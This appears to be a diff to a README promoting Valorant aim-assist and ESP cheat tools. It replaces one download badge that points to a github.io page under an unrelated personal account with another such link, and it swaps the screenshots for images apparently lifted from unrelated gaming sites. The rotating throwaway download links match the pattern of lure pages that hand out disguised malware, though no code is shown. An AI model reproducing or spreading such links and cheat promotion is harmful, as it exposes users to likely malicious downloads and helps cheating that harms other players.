@@ -4,7 +4,8 @@
 
 <h1 align="center">🎯 Valorant Aim Assist and ESP Tools</h1>
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://kimberlyking1268554.github.io/.github/valorant-assist-and-tools)
+[![GET Valorant Aim](https://img.shields.io/badge/GET%20%E2%80%94%20Valorant-Aim-0078D6?style=for-the-badge&logoColor=white)](https://francesvenskoske.github.io/.github/Valorant-Aim)
+
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2024_10/3(2).webp.dd23119aab6ce86a770a22620e24bd4a.webp" alt="Valorant Aim Assist and ESP Tools Preview" width="800" />
@@ -51,11 +52,11 @@
 ## 📷 Screenshots
 
 <p align="center">
-  <img src="https://www.skycheats.com/uploads/monthly_2024_10/m1(2).webp.57bc46a5deae04ebbea856a628be1385.webp" alt="Valorant ESP Overlay View" width="400" />
+  <img src="https://www.thespike.gg/_next/image?url=https%3A%2F%2Fcdn.thespike.gg%2F.Eray%252Fimage2_1726002508168.jpg&w=3840&q=75" alt="Valorant ESP Overlay View" width="400" />
 </p>
 
 <p align="center">
-  <img src="https://www.skycheats.com/uploads/monthly_2024_10/m2(2).webp.599b37ac4fca865b04e63c9bb73b07fe.webp" alt="Valorant Aim Assist Settings" width="400" />
+  <img src="https://www.exitlag.com/blog/wp-content/uploads/2024/07/valorant-crosshair-settings.webp" width="400" />
 </p>
 
 ---
